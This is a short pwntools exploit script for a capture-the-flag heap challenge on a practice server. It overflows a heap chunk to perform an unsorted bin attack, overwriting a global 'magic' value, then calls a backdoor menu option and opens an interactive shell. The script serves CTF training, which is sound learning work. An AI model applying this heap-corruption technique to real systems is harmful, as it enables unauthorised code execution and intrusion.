from pwn import *


ld_path = ""
libc_path = ""
# p = process([ld_path, ""], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 26733)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def add(size, con):
    sa("Your choice :", "1")
    sa("Size of Heap : ", str(size))
    sa("Content of heap:", con)

def edit(index, size, con):
    sa("Your choice :", "2")
    sa("Index :", str(index))
    sa("Size of Heap : ", str(size))
    sa("Content of heap : ", con)

def free(index):
    sa("Your choice :", "3")
    sa("Index :", str(index))

def back_door():
    sa("Your choice :", "4869")


magic_addr = 0x06020A0

# unsorted bin attack
add(0x10, "0")
add(0x80, "1")
add(0x10, "2")
free(1)
pad = cyclic(0x10)+p64(0)+p64(0x91)
pad += p64(0)+p64(magic_addr-0x10)
edit(0, len(pad), pad)
add(0x80, "1")

# attack 
back_door()

p.interactive()


